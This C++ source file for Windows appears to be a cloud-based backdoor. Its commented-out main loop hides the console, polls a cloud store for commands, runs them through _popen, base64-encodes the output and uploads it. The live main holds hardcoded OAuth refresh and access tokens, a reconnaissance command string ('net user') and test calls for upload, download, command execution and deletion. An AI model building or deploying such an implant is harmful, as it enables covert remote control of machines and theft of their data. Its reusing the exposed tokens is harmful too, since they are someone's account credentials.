#include <stdio.h>
#include <iostream>
#include <windows.h>
#include "MyString.h"
#include "CloudFunctions.h"
#include <stdio.h>

int Odd_Num() {
    int result = rand();
    if (result % 2 == 1)
        return result;
    else
        return result - 1;
}

//int main() {
//    //HWND h = GetConsoleWindow();
//    //ShowWindow(h, 0);
//    DWORD i = 2;
//    while (Odd_Num() % 2 != 0) {
//        Sleep(expo(i, 4) * 1000);
//        MyString data = downloadContext();
//        if (data.getLength() > 0) {
//            
//            i = 2;
//            for (int i = 0; i < data.getLength(); i++) {
//                if (data.getCharAt(i) == '\n') {
//                    data.setCharAt(i, '&');
//                }
//            }
//            FILE* file = _popen(data.getContext(), "r");
//            MyString output = "";
//            char temp_buffer[1024];
//            while (fgets(temp_buffer, sizeof(temp_buffer), file) != NULL) {
//                output = output + temp_buffer;
//            }
//            //output = encoder(output, 1);
//            output = converter_64(output);
//            upload(output);
//            deleteContext();
//        } else {
//            i++;
//        }
//    }
//    return 0;
//}

int main() {
    std::string input = "dir\nnet user\necho bs";
    std::string output;
    std::string refreshToken = "1//096ZhTtrDfXWZCgYIARAAGAkSNwF-L9Irke58b_l5qre3YgjxF1s1ECbfBxm3GCk6AQ8QO-pVQmCfvdjZA642F2UH5ba9SXVPLc0";
    std::string accessToken = "ya29.a0AcM612yAGs8UlIH-gS2FWZoRh1CJbVp6MuvnOgITPeR8rVIhIxH7lRUnb6HYprjxGB9s5HKSwr7rC243kUafPzZRhaMogGtSz7HYSyMmKIy2v715KlgnqDLvJBcx-RhH1rdYy4u8s4O47bm-YepXVsqmxsZEgpLZqp_6JsDGaCgYKAS4SARASFQHGX2MiyUaUXVQWZZJqaljl27SHjA0175";
    output = "Start!";
    //for (int i = 0; i < 10 * 1024; i++)
    //{
    //    output += "a";
    //}
    //output += "End!";
    WORD errorCode;
    //errorCode = singlePartUpload(output, accessToken, 151, 27);
    //errorCode = downloadSourceContext(accessToken, output);
    //DWORD responseCode;
    //errorCode = setNewRefreshAndAccessToken(refreshToken, accessToken);
    //handleFailsafe(refreshToken, accessToken);
    //printf("Test begins:\nThe refresh token is: %s\nThe access token is: %s\nWith the response code: %d\n", refreshToken.c_str(), accessToken.c_str(), errorCode);

    //downloadContext(accessToken, output);
    //printf("Test begins:\nThe single upload error code: %d", errorCode);
    //printf_s("Source Context is: %s", output.c_str());
    //std::replace(input.begin(), input.end(), '\n', '&');
    
    //commandExecuter(input, output);
    //printf("Command execution result: %s", output.c_str());
    
    //errorCode = deleteSource(accessToken);
    //printf("Source deleted with code: %d", errorCode);
    //errorCode = uploadResult(output, accessToken, 4);
    //printf("Upload is done with code: %d\n", errorCode);

    return 0;
}

void main1() {
    FILE* file = _popen("dir&dir&dir&dir&dir&dir&dir&dir&dir", "r");
    char buffer[1024];
    while (fgets(buffer, 1024, file))
    {
        printf("%s", buffer);
    }

}